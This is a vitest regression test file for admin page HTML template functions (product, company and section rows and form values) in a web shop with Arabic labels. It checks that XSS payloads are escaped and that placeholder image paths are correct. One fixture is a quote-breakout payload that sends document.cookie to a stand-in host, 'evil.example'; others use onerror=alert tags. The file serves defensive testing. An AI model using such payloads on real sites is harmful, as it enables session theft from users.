import { describe, it, expect } from 'vitest';
import {
  renderProductFormFieldValues,
  renderProductRow,
  renderSectionFormFieldValues,
  renderSectionRow,
  renderCompanyRow,
} from '../src/js/admin/admin-templates.js';

// Regression guard for /cso Finding #3: sanitizeInput() only strips <tags>,
// it does not escape quote characters -- so a value with no angle brackets
// at all (e.g. `x" onload="...`) sailed through it untouched and broke out
// of the surrounding HTML attribute (value=, alt=, title=) when rendered.
// These payloads deliberately contain NO '<' or '>' to prove that escaping
// (not sanitizeInput) is what closes the hole.

const attrBreakoutPayload = `x" onload="fetch('//evil.example/c?'+document.cookie)`;
const tagPayload = '<img src=x onerror=alert(1)>';

describe('renderProductFormFieldValues', () => {
  it('escapes a quote-breakout payload in the name value attribute', () => {
    const { name } = renderProductFormFieldValues({ name: attrBreakoutPayload, description: '' });
    expect(name).not.toContain('" onload="');
    expect(name).toContain('&quot; onload=&quot;');
  });

  it('handles no editing product', () => {
    const { name, description } = renderProductFormFieldValues(null);
    expect(name).toBe('');
    expect(description).toBe('');
  });
});

describe('renderProductRow', () => {
  it('escapes a quote-breakout payload in the image alt attribute', () => {
    const html = renderProductRow({ id: '1', name: attrBreakoutPayload, description: '', primary_image_url: '' }, 'قسم');
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });

  it('escapes a raw tag payload in the name/description text nodes', () => {
    const html = renderProductRow({ id: '1', name: tagPayload, description: tagPayload, primary_image_url: '' }, 'قسم');
    expect(html).not.toContain(tagPayload);
  });

  it('escapes an attribute-breakout payload in the image src (defense in depth)', () => {
    const html = renderProductRow({ id: '1', name: 'منتج', description: '', primary_image_url: '"><img src=x onerror=alert(3)>' }, 'قسم');
    expect(html).not.toContain('"><img src=x onerror=alert(3)>');
  });

  // Regression guard: this admin page lives at src/pages/admin/products.html,
  // one directory deeper than src/pages/category.html (where the shorter
  // '../../public/...' convention originated) -- reaching repo-root/public/
  // from here needs three '../', not two. A missing level renders a broken
  // <img> for any product with no primary_image_url. Anchored to the src
  // attribute (not a plain .toContain) because the correct three-level path
  // contains the buggy two-level one as a substring.
  it('falls back to the correctly-pathed placeholder image when primary_image_url is missing', () => {
    const html = renderProductRow({ id: '1', name: 'منتج', description: '', primary_image_url: '' }, 'قسم');
    expect(html).toMatch(/src="\.\.\/\.\.\/\.\.\/public\/assets\/placeholder\.svg"/);
    expect(html).not.toMatch(/src="\.\.\/\.\.\/public\//);
  });
});

describe('renderCompanyRow', () => {
  it('escapes a quote-breakout payload in the logo alt attribute', () => {
    const html = renderCompanyRow({ id: '1', name: attrBreakoutPayload, description: '', logo_url: '', is_active: true });
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });

  it('escapes a raw tag payload in the name/description text nodes', () => {
    const html = renderCompanyRow({ id: '1', name: tagPayload, description: tagPayload, logo_url: '', is_active: true });
    expect(html).not.toContain(tagPayload);
  });

  // Same class of bug as renderProductRow above, fixed alongside it.
  it('falls back to the correctly-pathed placeholder image when logo_url is missing', () => {
    const html = renderCompanyRow({ id: '1', name: 'شركة', description: '', logo_url: '', is_active: true });
    expect(html).toMatch(/src="\.\.\/\.\.\/\.\.\/public\/assets\/placeholder\.svg"/);
    expect(html).not.toMatch(/src="\.\.\/\.\.\/public\//);
  });
});

describe('renderSectionFormFieldValues', () => {
  it('escapes a quote-breakout payload in the name value attribute', () => {
    const { name } = renderSectionFormFieldValues({ name: attrBreakoutPayload, description: '' });
    expect(name).not.toContain('" onload="');
    expect(name).toContain('&quot; onload=&quot;');
  });
});

describe('renderSectionRow', () => {
  it('escapes a quote-breakout payload in the description title attribute', () => {
    const html = renderSectionRow({ id: '1', name: 'قسم', description: attrBreakoutPayload, icon_name: 'laundry.svg' }, 0);
    expect(html).not.toContain('" onload="');
    expect(html).toContain('&quot; onload=&quot;');
  });
});
